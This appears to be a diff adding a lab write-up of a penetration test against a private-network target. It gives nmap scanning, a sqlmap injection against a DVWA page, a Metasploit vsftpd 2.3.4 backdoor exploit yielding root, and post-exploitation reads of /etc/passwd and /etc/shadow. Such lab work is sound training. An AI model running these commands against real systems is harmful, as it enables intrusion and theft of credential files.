@@ -1,0 +1,81 @@
+1. Reconnaissance (Host Discovery)
+nmap -sn 192.168.11.0/24
+
+Purpose: Identify active hosts in the network
+Result: Target system (192.168.11.129) detected
+
+🔹 2. Scanning & Enumeration
+nmap -sV 192.168.11.129
+
+Purpose: Detect open ports, services, and versions
+Result: Identified vulnerable services (FTP, Telnet, HTTP, SMB, MySQL, Tomcat)
+
+🔹 3. SQL Injection Testing (sqlmap)
+sqlmap -u "http://192.168.11.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" --dbs --batch
+
+Purpose: Automate SQL Injection detection and database extraction
+Result: Database enumeration successful
+
+🔹 4. Manual Web Testing (Burp Suite)
+
+(No CLI command — GUI-based tool)
+
+Steps:
+
+Enable proxy interception
+Capture HTTP requests
+Modify parameters (test XSS / input validation)
+
+Purpose: Identify XSS and session flaws
+
+🔹 5. Vulnerability Scanning (OpenVAS)
+
+(GUI-based tool — no direct CLI used)
+
+Steps:
+
+Create target
+Run scan task
+Analyze CVSS results
+
+Purpose: Detect critical vulnerabilities
+
+🔹 6. Exploitation (Metasploit)
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.11.129
+run
+
+Purpose: Exploit vsftpd 2.3.4 backdoor
+Result: Root-level shell access obtained
+
+🔹 7. Post-Exploitation
+whoami
+uname -a
+ps aux
+cat /etc/passwd
+cat /etc/shadow
+
+Purpose:
+
+Verify privileges
+Gather system info
+Access sensitive files
+
+Result: Full system compromise confirmed
+
+🔹 8. Evidence Integrity (Hashing)
+sha256sum evidence.txt
+
+Purpose: Ensure integrity of collected evidence
+
+🔹 9. Network Analysis (Wireshark)
+
+(GUI-based tool)
+
+Steps:
+
+Start capture on eth0
+Analyze packets (ARP, HTTP, etc.)
+
+Purpose: Detect unencrypted traffic
